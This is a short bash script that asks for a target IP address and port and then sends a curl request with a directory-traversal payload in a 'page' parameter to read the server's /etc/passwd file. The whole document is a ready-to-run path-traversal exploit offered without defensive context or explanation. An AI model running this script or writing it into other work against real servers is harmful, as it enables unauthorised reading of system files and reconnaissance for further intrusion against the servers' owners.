  
#!/usr/bin/env bash
echo "Enter IP address"
read IP
echo "Enter PORT (only 80, 8080)"
read PORT
echo "WAIT.................................."
curl "http://${IP}:${PORT}/?page=../../../../../../../etc/passwd"
